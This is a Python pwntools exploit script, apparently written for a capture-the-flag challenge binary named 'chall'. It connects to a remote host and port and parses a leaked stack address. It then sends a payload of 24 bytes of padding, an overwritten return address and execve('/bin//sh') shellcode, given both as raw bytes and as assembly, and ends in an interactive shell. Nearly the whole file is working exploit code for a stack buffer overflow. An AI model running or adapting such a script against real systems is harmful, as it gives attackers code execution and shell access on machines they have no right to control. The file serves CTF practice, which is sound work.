#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')
context.terminal = ['alacritty', '-e', 'sh', '-c']
host = args.HOST or '35.238.225.156'
port = int(args.PORT or 1008)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
init-pwndbg
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
offset = 24 # pattern = daaaaaaa
padding = 'aaaaaaaabaaaaaaacaaaaaaa'
#shellcode = 
"""
\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf
\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05
0x0068732F6E69622F
"""
shellcode = """
mov rax, 0x3b
xor rdx, rdx;
xor rdi, rdi;
xor rsi, rsi;
movabs  rdi, 0x0068732F6E69622F
push    rdi
mov rdi, rsp
syscall 
"""
shellcode = asm(shellcode)
leak = io.recvuntil("]").strip("]")
leak = leak.split("[")
leak = int(leak[1], 16)
print(hex(leak))
print(len(shellcode))
rip = leak + 32
payload = padding + p64(rip) + shellcode
io.recv()
io.send(payload)

io.interactive()

